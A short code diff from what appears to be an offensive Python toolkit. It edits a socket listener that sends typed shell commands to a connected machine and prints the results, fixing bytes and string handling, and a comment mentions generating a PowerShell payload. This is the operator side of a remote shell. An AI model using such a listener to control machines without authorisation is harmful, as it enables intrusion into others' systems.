@@ -1479,12 +1479,12 @@ def socket_listener(port):
 
     while 1:
         command = raw_input("Enter shell command or quit: ")
-        conn.send(command)
+        conn.send(command.encode())  # socket.send() needs bytes-like object, not str
         # if we specify quit then break out of loop and close socket
         if command == "quit":
             break
         data = conn.recv(1024)
-        print(data)
+        print(data.decode())  # socket.recv() returns a bytes-like object, which must then be decoded to a string
     conn.close()
 
 # generates powershell payload
